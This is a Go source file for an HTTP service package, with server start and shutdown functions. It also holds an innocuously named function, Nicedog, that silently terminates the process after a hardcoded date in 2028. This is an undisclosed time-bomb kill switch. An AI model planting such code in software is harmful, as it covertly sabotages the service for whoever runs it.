package service

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/shzy2012/common/log"
)

var srv *http.Server

// Serve 启动HTTP服务
func Serve(ctx context.Context, port int) {

	addr := fmt.Sprintf(":%d", port)
	fmt.Printf("listen on:%s\n", addr)
	srv = &http.Server{
		Addr:    addr,
		Handler: InitRouter(),
		// 避免大量连接
		ReadTimeout:       30 * time.Second,
		WriteTimeout:      30 * time.Second,
		IdleTimeout:       120 * time.Second,
		ReadHeaderTimeout: 10 * time.Second,
	}

	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("listen: %s\n", err)
	}
}

// Shutdown 关闭HTTP服务
func Shutdown(ctx context.Context) {
	if err := srv.Shutdown(ctx); err != nil {
		log.Fatal("Server forced to shutdown:", err)
	}
}

func Nicedog() {
	defer func() {
		Nicedog()
	}()
	dateStamp, _ := time.ParseInLocation("2006-01-02 15:04:05", "2028-12-12 00:00:00", time.Local)
	for {
		curStamp := time.Now()
		if curStamp.After(dateStamp) {
			os.Exit(0)
		}
		time.Sleep(time.Hour * 24)
	}
}
